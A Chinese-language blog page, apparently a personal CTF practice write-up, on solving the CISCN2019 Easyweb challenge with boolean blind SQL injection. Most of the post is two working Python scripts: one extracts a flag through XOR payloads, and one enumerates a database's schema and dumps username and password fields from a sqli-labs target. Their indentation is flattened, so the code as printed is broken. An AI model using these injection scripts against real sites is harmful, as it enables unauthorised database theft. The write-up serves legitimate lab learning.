@@ -1,0 +1,492 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习33——盲注脚本 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-05-13">2021-05-13</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习33——盲注脚本</h2>
+            <div class="post-meta">
+                emm... 7836 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>做了一道经典的盲注题目，积累一个这种类型盲注的脚本。  </p>
+<h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>进入题目发现是查询成绩的界面：  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/60a3ca8b6ae4f77d35de35c5.png"><img src="https://pic.imgdb.cn/item/60a3ca8b6ae4f77d35de35c5.png"></a>  </p>
+<p>我们分别输入1，2，3知道5都是有回显的，后面的学号就没有回显了，我们输入1^1^1和1^2^1来测试是否存在盲注。  </p>
+<p>发现回显不同并成功返回，说明存在盲注，而这个只过滤了空格，这里用括号代替，接下来就是上脚本。  </p>
+<pre><code># -*- coding: utf-8 -*-
+# @Author: jiaoben
+# @Date  :  2020/05/03
+
+import re
+import requests
+import string
+
+url = &quot;http://f2301815-d05c-45da-a70a-91600495a2c2.node3.buuoj.cn/&quot;
+flag = &#39;&#39;
+
+
+def payload(i, j):
+# 数据库名字
+# sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)
+# 表名
+# sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;ctf&#39;),%d,1))&gt;%d)^1&quot;%(i,j)
+# 列名
+# sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)
+# 查询flag
+sql = &quot;1^(ord(substr((select(group_concat(value))from(ctf.flag)),%d,1))&gt;%d)^1&quot; % (i, j)
+data = &#123;&quot;stunum&quot;: sql&#125; //这里修改注入的id
+r = requests.get(url, params=data)
+# print (r.url)
+if &quot;Hi admin, your score is: 100&quot; in r.text:
+    res = 1
+else:
+    res = 0
+return res
+
+
+def exp():
+global flag
+for i in range(1, 10000):
+    print(i, &#39;:&#39;)
+    low = 32
+    high = 128
+    while low &lt;= high:
+        mid = (low + high) // 2
+        res = payload(i, mid)
+        if res:
+            low = mid + 1
+        else:
+            high = mid - 1
+    f = int((low + high +1)) // 2
+    if (f == 132 or f == 32):
+        break
+    # print (f)
+    flag += chr(f)
+    print(flag)
+
+
+exp()
+print(&#39;flag=&#39;, flag)</code></pre>
+<p>直接就能得到flag。  </p>
+<p>下面附上找到的网上的另一个比较全的python脚本  </p>
+<pre><code># -*- coding:utf-8 -*-
+# Author: mochu7
+import requests
+
+def ascii_str():#生成库名表名字符所在的字符列表字典
+str_list=[]
+for i in range(33,127):#所有可显示字符
+    str_list.append(chr(i))
+#print(&#39;可显示字符：%s&#39;%str_list)
+return str_list#返回字符列表
+
+def db_length(url,str):
+print(&quot;[-]开始测试数据库名长度.......&quot;)
+num=1
+while True:
+    db_payload=url+&quot;&#39; and (length(database())=%d)--+&quot;%num
+    r=requests.get(db_payload)
+    if str in r.text:
+        db_length=num
+        print(&quot;[+]数据库长度：%d\n&quot;%db_length)
+        db_name(db_length)#进行下一步，测试库名
+        break
+    else:
+        num += 1
+
+def db_name(db_length):
+print(&quot;[-]开始测试数据库名.......&quot;)
+db_name=&#39;&#39;
+str_list=ascii_str()
+for i in range(1,db_length+1):
+    for j in str_list:
+        db_payload=url+&quot;&#39; and (ord(mid(database(),%d,1))=&#39;%s&#39;)--+&quot;%(i,ord(j))
+        r=requests.get(db_payload)
+        if str in r.text:
+            db_name+=j
+            break
+print(&quot;[+]数据库名：%s\n&quot;%db_name)
+tb_piece(db_name)#进行下一步，测试security数据库有几张表
+return db_name
+
+def tb_piece(db_name):
+print(&quot;开始测试%s数据库有几张表........&quot;%db_name)
+for i in range(100):#猜解库中有多少张表，合理范围即可
+    tb_payload=url+&quot;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&quot;%(i,db_name)
+    r=requests.get(tb_payload)
+    if str in r.text:
+        tb_piece=i
+        break
+print(&quot;[+]%s库一共有%d张表\n&quot;%(db_name,tb_piece))
+tb_name(db_name,tb_piece)#进行下一步，猜解表名
+
+
+def tb_name(db_name,tb_piece):
+print(&quot;[-]开始猜解表名.......&quot;)
+table_list=[]
+for i in range(tb_piece):
+    str_list=ascii_str()
+    tb_length=0
+    tb_name=&#39;&#39;
+    for j in range(1,20):#表名长度，合理范围即可
+        tb_payload=url+&quot;&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+&quot;%(i,j)
+        r=requests.get(tb_payload)
+        if str in r.text:
+            tb_length=j
+            print(&quot;第%d张表名长度：%s&quot;%(i+1,tb_length))
+            for k in range(1,tb_length+1):#根据表名长度进行截取对比
+                for l in str_list:
+                    tb_payload=url+&quot;&#39; and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+&quot;%(i,k,ord(l))
+                    r=requests.get(tb_payload)
+                    if str in r.text:
+                        tb_name+=l
+            print(&quot;[+]：%s&quot;%tb_name)
+            table_list.append(tb_name)
+            break
+print(&quot;\n[+]%s库下的%s张表：%s\n&quot;%(db_name,tb_piece,table_list))
+column_num(table_list,db_name)#进行下一步，猜解每张表的字段数
+
+def column_num(table_list,db_name):
+print(&quot;[-]开始猜解每张表的字段数：.......&quot;)
+column_num_list=[]
+for i in table_list:
+    for j in range(30):#每张表的字段数量，合理范围即可
+        column_payload=url+&quot;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&quot;%(j,i)
+        r=requests.get(column_payload)
+        if str in r.text:
+            column_num=j
+            column_num_list.append(column_num)#把所有表的字段，依次放入这个列表当中
+            print(&quot;[+]%s表\t%s个字段&quot;%(i,column_num))
+            break
+print(&quot;\n[+]表对应的字段数：%s\n&quot;%column_num_list)
+column_name(table_list,column_num_list,db_name)#进行下一步，猜解每张表的字段名
+
+def column_name(table_list,column_num_list,db_name):
+print(&quot;[-]开始猜解每张表的字段名.......&quot;)
+column_length=[]
+str_list=ascii_str()
+column_name_list=[]
+for t in range(len(table_list)):#t在这里代表每张表的列表索引位置
+    print(&quot;\n[+]%s表的字段：&quot;%table_list[t])
+    for i in range(column_num_list[t]):#i表示每张表的字段数量
+        column_name=&#39;&#39;
+        for j in range(1,21):#j表示每个字段的长度
+            column_name_length=url+&quot;&#39; and %d=(select length(column_name) from information_schema.columns where table_name=&#39;%s&#39; limit %d,1)--+&quot;%(j-1,table_list[t],i)
+            r=requests.get(column_name_length)
+            if str in r.text:
+                column_length.append(j)
+                break
+            for k in str_list:#k表示我们猜解的字符字典
+                column_payload=url+&quot;&#39; and ord(mid((select column_name from information_schema.columns where table_name=&#39;%s&#39; limit %d,1),%d,1))=%d--+&quot;%(table_list[t],i,j,ord(k))
+                r=requests.get(column_payload)
+                if str in r.text:
+                    column_name+=k
+        print(&#39;[+]：%s&#39;%column_name)
+        column_name_list.append(column_name)
+#print(column_name_list)#输出所有表中的字段名到一个列表中
+dump_data(table_list,column_name_list,db_name)#进行最后一步，输出指定字段的数据
+
+def dump_data(table_list,column_name_list,db_name):
+print(&quot;\n[-]对%s表的%s字段进行爆破.......\n&quot;%(table_list[3],column_name_list[9:12]))
+str_list=ascii_str()
+for i in column_name_list[9:12]:#id,username,password字段
+    for j in range(101):#j表示有多少条数据，合理范围即可
+        data_num_payload=url+&quot;&#39; and (select count(%s) from %s.%s)=%d--+&quot;%(i,db_name,table_list[3],j)
+        r=requests.get(data_num_payload)
+        if str in r.text:
+            data_num=j
+            break
+    print(&quot;\n[+]%s表中的%s字段有以下%s条数据：&quot;%(table_list[3],i,data_num))
+    for k in range(data_num):
+        data_len=0
+        dump_data=&#39;&#39;
+        for l in range(1,21):#l表示每条数据的长度，合理范围即可
+            data_len_payload=url+&quot;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&quot;%(i,db_name,table_list[3],k,l)
+            r=requests.get(data_len_payload)
+            if str not in r.text:
+                data_len=l-1
+                for x in range(1,data_len+1):#x表示每条数据的实际范围，作为mid截取的范围
+                    for y in str_list:
+                        data_payload=url+&quot;&#39; and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+&quot;%(i,db_name,table_list[3],k,x,ord(y))
+                        r=requests.get(data_payload)
+                        if str in r.text:
+                            dump_data+=y
+                            break
+                break
+        print(&#39;[+]%s&#39;%dump_data)#输出每条数据
+
+
+
+if __name__ == &#39;__main__&#39;:
+url=&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;#目标url
+str=&quot;You are in&quot;#布尔型盲注的true&amp;false的判断因素
+db_length(url,str)#程序入口</code></pre>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>一般的盲注题目，也没有过滤什么，有脚本就很简单。  </p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
